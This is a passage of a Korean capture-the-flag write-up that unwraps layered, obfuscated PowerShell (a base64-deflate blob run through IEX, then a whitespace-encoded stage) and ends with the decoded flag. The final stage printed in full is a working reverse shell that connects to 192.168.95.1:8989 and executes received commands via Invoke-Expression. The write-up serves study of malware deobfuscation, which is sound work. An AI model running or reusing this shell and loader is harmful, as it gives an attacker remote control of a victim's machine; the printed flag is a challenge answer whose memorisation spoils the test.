iEx ( NEw-ObJeCt IO.CoMPrEsSION.DEFlaTEStREam([io.mEMOrYstReaM] [SyStEm.cOnveRT]::FRomBasE64stRING( '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' ) , [SYstEm.iO.CompResSIon.CoMPRESsionmodE]::deCompRess ) | ForEACh{NEw-ObJeCt iO.StReaMREADer($_ ,[sysTEm.tExT.eNcoDINg]::Ascii) } ).ReADtoEnD( )
```

### 다섯번째 스크립트

다섯 번째 스크립트에는 뭔가 굉장히 많은 양의 문자가 출력이 된다.

```powershell
'

...

' | fOReAcH-objecT {$pWvKG=$_ -CSPLIt '                ' | fOReAcH-objecT{'    ';$_ -CSPLIt '  '|fOReAcH-objecT{ $_.lEngTh - 1 }} ; . ( ([STrINg]''.lAStindeXOfaNY)[117,45,80]-JOIN'') (-JOin ([cHaR[]][inT[]]( -JOin($pWvKG[0..($pWvKG.lEngTh-1)] ) ).TRIMSTArt('      ' ).splIt('    ' )) )}
```

어떤 값이 출력되었는지 보기 위해 redirection을 통해 파일로 만들어 주었다.( `> script5`)

```powershell
( NEw-ObJeCt IO.CoMPrEsSION.DEFlaTEStREam([io.mEMOrYstReaM] [SyStEm.cOnveRT]::FRomBasE64stRING( '7VlbaxtHGH2efzEPhpUgEjG0tBD6YEJp1ItdbEFbhAiJ66Quxg2p6Uvi/175sjvf5XyzM3vTSrED8ezsdznnfGdGdlJ47zZ/Nn+7u9X98v6renbVFnmr4h8enXwnquhGNM+V265KcZ5tsXehXN3qETtkwuBEIgR1xqUhKtc

...(생략)

c/niyOi2LqJ5vV5fUm6/zVm9PVer26vF5uvk38/f7kAe/q+Xz+uHzsOTucrv3UT+fL08UvZ8ujjzeT4o7xdP7vh6vF3cNmvXl/+z8=' ) , [SYstEm.iO.CompResSIon.CoMPRESsionmodE]::deCompRess ) | ForEACh{NEw-ObJeCt iO.StReaMREADer($_ ,[sysTEm.tExT.eNcoDINg]::Ascii) } ).ReADtoEnD( ) > script5
```

Hxd를 통해 보면 `\t` 과 space로 이루어진 것을 볼 수 있다. 

![Untitled](Untitled%203.png)

출력된 스크립트를 그대로 실행시키려고 했지만, NULL값(`\x00`)과 이상한 값(`\xff\xfe`)이 섞여있고, 탭(`\t`)과 스페이스로 되어 있어서 가독성이 좋지 않아 해당 데이터를 살짝 가공해 주었다.

- 가공된 스크립트
    
    ```powershell
    '..-.-...--..-..-........--..-..-.--..........-..........--..-..-.......--..-.-......--..-..-..--..-..-.--....-...--..-..-......--..-.-.....--..-....--..-.--..-...-....--..-....--..-.--....-...--....-...--....-...--....-...--.........-.--..........-........--..-..-.....--..........-........--..-.-..........--....-...--..-....--..-.--....-...--....-...--....-...--....-...--.....-.--..-....--..-.--....-...--....-...--....-...--....-...--....-...--....-...--....-...--....-...--..........-..--.........-.-
    
    ...(중략)
    
    -.....--....-...--....-.....--.....-..........--......-........--......-.--.....-.......--.....-..........--......-.....--......-.......--.....-.......--......-........--......-....--.....-.......--.....-..........--....-.....--....-...--......-.......--......-........--......-.......--......-........--..-....--..-.' | fOReAcH-objecT {$pWvKG=$_ -CSPLIt '--' | fOReAcH-objecT{'-';$_ -CSPLIt '-'|fOReAcH-objecT{ $_.lEngTh - 1 }} ; . ( ([STrINg]''.lAStindeXOfaNY)[117,45,80]-JOIN'') (-JOin ([cHaR[]][inT[]]( -JOin($pWvKG[0..($pWvKG.lEngTh-1)] ) ).TRIMSTArt('-.' ).splIt('-' )) )}
    ```
    

위의 스크립트를 돌릴 때도 마찬가지로 IEX를 제외시켜주고 돌린다.

1. IEX(`. ( ([STrINg]''.lAStindeXOfaNY)[117,45,80]-JOIN'')`) 전까지 실행
2. IEX 이후에 있는 `(-JOin ([cHaR[]][inT[]]( -JOin($pWvKG[0..($pWvKG.lEngTh-1)] ) ).TRIMSTArt('-.' ).splIt('-' )) )` 를 실행.

    ```powershell
    '..-.-...--..-..-........--..-..-.--..........-..........--..-..-.......--..-.-......--..-..-..--..-..-.--....-...--..-..-......--..-.-.....--..-....--..-.--..-...-....--..-....--..-.--....-...--....-...--....-...--....-...--.........-.--..........-........--..-..-.....--..........-........--..-.-..........--....-...--..-....--..-.--....-...--....-...--....-...--....-...--.....-.--..-....--..-.--....-...--....-...--....-...--....-...--....-...--....-...--....-...--....-...--..........-..--.........-.-

    ...(중략)

    -.....--....-...--....-.....--.....-..........--......-........--......-.--.....-.......--.....-..........--......-.....--......-.......--.....-.......--......-........--......-....--.....-.......--.....-..........--....-.....--....-...--......-.......--......-........--......-.......--......-........--..-....--..-.' | fOReAcH-objecT {$pWvKG=$_ -CSPLIt '--' | fOReAcH-objecT{'-';$_ -CSPLIt '-'|fOReAcH-objecT{ $_.lEngTh - 1 }} ; (-JOin ([cHaR[]][inT[]]( -JOin($pWvKG[0..($pWvKG.lEngTh-1)] ) ).TRIMSTArt('-.' ).splIt('-' )) )}
    ```

### 마지막 스크립트

위의 스크립트를 실행시키면 아래와 같이 스크립트가 출력된다. 중간에 `show flag` 라 작성된 부분에 정수가 들어있는 튜플 자료형과 `0x49`와 xor하는 것을 볼 수 있다.

```powershell
function sh
{
    Param
    (
        [Parameter(mandatory=$true, Position=0)]
        [string] $ip_addr,
        [Parameter(mandatory=$true, Position=1)]
        [int] $port

    )
    $socket = New-Object System.Net.Sockets.TcpClient($ip_addr, $port)
    $stream = $socket.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object System.Byte[] 1024
    $encoding = New-Object System.Text.ASCIIEncoding
    $writer.AutoFlush = $true

    while($true)
    {
        while($stream.DataAvailable)
        {
            $read = $stream.Read($buffer, 0, 1024)
            $remote_command = ($encoding.GetString($buffer, 0, $read))
            if ($remote_command)
            {
                try
                {
                    if ($remote_command.startswith("show flag"))
                    {
                        $return = ( -joiN ( ( 62,33, 32,61 ,44,33,40 , 61,123 , 121 ,123 ,122, 50 , 120,44 , 123 , 40 , 125, 120, 40 ,40 ,127 , 44 ,47 ,43, 113 ,43, 125,122 ,47 , 121,120, 126, 121 ,47, 44,120 , 45 , 113,43 ,112 ,127 , 42, 121 ,113 , 52)| forEaCH {[ChaR]($_ -bXor'0x49' ) }))
                    }
                    else
                    {
                        $return = Invoke-Expression -Command $remote_command
                    }
                }
                catch [Exception]
                {
                    Write-Output $_
                    $return = "Invalid Command"
                }
            }
            foreach($item in $return)
            {
            $writer.WriteLine($item)
            }
        }

    }
    if($writer){$writer.Close()}
    if($stream){$stream.Close()}
};sh "192.168.95.1" 8989
```

해당 부분을 python 코드로 재현해서 flag를 얻을 수 있다. (아니면 저 부분을 그대로 긁어서 powershell에서 실행시켜도 된다.)

```python
data = ( 62,33, 32,61 ,44,33,40 , 61,123 , 121 ,123 ,122, 50 , 120,44 , 123 , 40 , 125, 120, 40 ,40 ,127 , 44 ,47 ,43, 113 ,43, 125,122 ,47 , 121,120, 126, 121 ,47, 44,120 , 45 , 113,43 ,112 ,127 , 42, 121 ,113 , 52)

flag = ''
for i in data:
	flag += chr(i ^ 0x49)

print(flag)
```

- flag : `whitehat2023{1e2a41aa6efb8b43f0170fe1d8b96c08}`